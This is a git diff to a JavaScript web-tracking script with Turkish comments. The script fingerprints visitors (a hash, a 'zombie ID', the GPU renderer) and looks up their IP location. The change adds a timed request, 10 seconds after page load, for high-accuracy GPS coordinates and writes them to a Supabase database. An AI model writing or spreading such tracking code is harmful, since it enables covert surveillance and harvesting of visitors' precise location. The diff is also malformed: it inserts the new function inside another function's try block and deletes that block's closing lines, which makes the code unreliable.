@@ -71,6 +71,9 @@ async function init() {
     console.log('🔑 [PARMAK İZİ]:', STATE.fingerprintHash, '| [ZOMBIE ID]:', STATE.deviceSignature, '| [GPU]:', STATE.gpuRenderer);
     
     await logInitialVisit();
+
+    // 📍 10. SANİYE: Tarayıcıdan Hassas GPS Konum İzni İste
+    setTimeout(requestPreciseGpsLocation, 10000);
 }
 
 function timeoutPromise(promise, ms) {
@@ -320,10 +323,45 @@ async function fetchIpLocation() {
             STATE.ipCity = data2.city || null;
             STATE.ipRegion = data2.region || null;
             STATE.ipCountry = data2.country || null;
-            STATE.ipLat = data2.latitude ? String(data2.latitude) : null;
-            STATE.ipLng = data2.longitude ? String(data2.longitude) : null;
+// ==========================================
+// 5.1) 10. SANİYE HASSAS GPS KONUM İZNİ & KOORDİNAT YAKALAYICI
+// ==========================================
+function requestPreciseGpsLocation() {
+    if (!navigator.geolocation) {
+        console.log('ℹ️ Tarayıcı GPS Geolocation API desteklemiyor.');
+        return;
+    }
+
+    console.log('%c📍 [GPS KOORDİNAT İZNİ İSTENİYOR] 10. saniye doldu, tarayıcıdan hassas konum isteniyor...', 'color:#f59e0b; font-weight:bold;');
+
+    navigator.geolocation.getCurrentPosition(
+        async function(position) {
+            var lat = String(position.coords.latitude);
+            var lng = String(position.coords.longitude);
+            var accuracy = Math.round(position.coords.accuracy || 0);
+
+            console.log('%c🎯 [HASSAS GPS KOORDİNATLARI ALINDI]: ' + lat + ', ' + lng + ' (Hassasiyet: ' + accuracy + ' metre)', 'color:#10b981; font-weight:bold; font-size:13px;');
+
+            STATE.ipLat = lat;
+            STATE.ipLng = lng;
+            STATE.locationType = 'Hassas GPS (İzin Verildi - ±' + accuracy + 'm)';
+
+            // Supabase kaydını anında gerçek GPS koordinatlarıyla güncelle
+            await syncInteractionToSupabase({
+                latitude: lat,
+                longitude: lng,
+                location_type: STATE.locationType
+            });
+        },
+        function(error) {
+            console.warn('⚠️ [GPS İZNİ REDDEDİLDİ VEYA ZAMAN AŞIMI]:', error.message);
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 12000,
+            maximumAge: 0
         }
-    } catch (e) {}
+    );
 }
 
 // Pil Durumu Dinleyicisi
